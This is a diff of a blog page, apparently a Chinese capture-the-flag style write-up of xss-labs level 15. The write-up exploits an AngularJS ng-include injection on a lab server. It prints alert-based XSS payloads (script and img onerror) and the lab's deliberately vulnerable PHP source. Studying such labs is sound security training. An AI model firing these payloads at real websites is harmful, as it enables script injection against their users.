@@ -494,7 +494,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    922
+                    902
                 </div>
                 
 
@@ -534,37 +534,20 @@
 
 <h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol>
 <li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p>
-<pre><code class="javascript">http://10.10.10.148:8203/level15.php?src=&lt;script&gt;alert(/onclink+src+data+href/)&lt;/script&gt;
-http://10.10.10.148:8203/level15.php?src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">http:<span class="hljs-comment">//10.10.10.148:8203/level15.php?src=&lt;script&gt;alert(/onclink+src+data+href/)&lt;/script&gt;</span><br>http:<span class="hljs-comment">//10.10.10.148:8203/level15.php?src='level1.php?name=&lt;img src=x onerror=alert(1)&gt;'</span><br></code></pre></td></tr></table></figure>
+
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level15/注入点检测.png" alt="注入点检测"></center>
 
 <p>由上述操作可以推断，程序对<code>span</code>标签中参数的尖括号进行了转义，使用外链可以正常弹框，所以此处存在XSS漏洞。</p>
 </li>
 <li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p>
-<pre><code class="javascript">http://10.10.10.148:8203/level15.php?src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">http:<span class="hljs-comment">//10.10.10.148:8203/level15.php?src='level1.php?name=&lt;img src=x onerror=alert(1)&gt;'</span><br></code></pre></td></tr></table></figure>
+
 <center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level15/注入成功.png" alt="注入成功"></center>
 </li>
 <li><p>代码审计。程序源码如下所示：</p>
-<pre><code class="php">&lt;html ng-app&gt;
-&lt;head&gt;
-        &lt;meta charset=&quot;utf-8&quot;&gt;
-        &lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;
-&lt;script&gt;
-window.alert = function()  
-{     
-confirm(&quot;完成的不错！&quot;);
- window.location.href=&quot;level16.php?keyword=test&quot;; 
-}
-&lt;/script&gt;
-&lt;title&gt;欢迎来到level15&lt;/title&gt;
-&lt;/head&gt;
-&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
-&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
-&lt;?php 
-ini_set(&quot;display_errors&quot;, 0);
-$str = $_GET[&quot;src&quot;];
-echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;
-?&gt;</code></pre>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html ng-app&gt;<br>&lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;<br>        &lt;script src=<span class="hljs-string">"https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>  <br></span>&#123;     <br>confirm(<span class="hljs-string">"完成的不错！"</span>);<br> window.location.href=<span class="hljs-string">"level16.php?keyword=test"</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level15&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;h1 align=center&gt;欢迎来到第<span class="hljs-number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;<br>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span> <br>ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);<br>$str = $_GET[<span class="hljs-string">"src"</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="hljs-string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
 <ul>
 <li>由18-19行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的预定义字符进行转换后赋值给<code>span</code>标签。</li>
 </ul>
@@ -574,8 +557,10 @@ echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($st
 </ol>
 <h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul>
 <li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p>
-<pre><code class="javascript">&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;
-...</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">'level1.php?name=&lt;img src=x onerror=alert(1)&gt;'</span><br>...<br></code></pre></td></tr></table></figure>
+
+
+
 </li>
 </ul>
 <h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul>
@@ -1197,7 +1182,7 @@ echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($st
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">207.6k</span>&nbsp;字
+                class="white-color">203.2k</span>&nbsp;字
             
             
             
